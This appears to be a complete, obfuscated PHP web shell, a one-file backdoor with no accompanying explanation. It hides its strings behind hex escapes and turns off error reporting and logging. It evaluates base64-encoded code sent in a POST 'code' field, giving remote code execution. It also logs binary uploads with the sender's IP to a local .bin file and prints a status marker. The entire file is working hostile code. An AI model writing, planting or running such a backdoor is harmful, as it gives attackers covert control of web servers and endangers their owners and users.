<?php @error_reporting(0); @ini_set("d\x69sp\x6cay_\x65rrors",0); @ini_set("\x6cog\x5fe\x72ro\x72s",0); @ini_set("e\x72r\x6fr_lo\x67",0); @ini_set("m\x65mory_\x6c\x69\x6d\x69t", "\x31\x328M"); @ini_set("\x6d\x61\x78\x5fe\x78ecu\x74ion_tim\x65",30); @set_time_limit(30); if (isset($_SERVER["H\x54TP_X_REAL_\x49P"])) $_SERVER["\x52E\x4dO\x54E_\x41DD\x52"] = $_SERVER["H\x54TP_X_REAL_\x49P"]; if (isset($_POST["code"])) { eval(base64_decode($_POST["code"])); } elseif (isset($_SERVER["HT\x54P_CONTENT_E\x4eC\x4fD\x49NG"]) && $_SERVER["HT\x54P_CONTENT_E\x4eC\x4fD\x49NG"] == "\x62ina\x72y") { $input = file_get_contents("php\x3a/\x2f\x69\x6ep\x75\x74"); if (strlen($input) > 0) print "STA\x54\x55S-I\x4dPORT-O\x4b"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2eph\x70",".bin",basename($_SERVER["\x53\x43RI\x50T\x5fFILEN\x41ME"])), "a"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52E\x4dO\x54E_\x41DD\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["REQ\x55E\x53T_URI"], ".s\x68\x74ml") !== false) { print $_SERVER["REQ\x55E\x53T_URI"]; } exit; ?>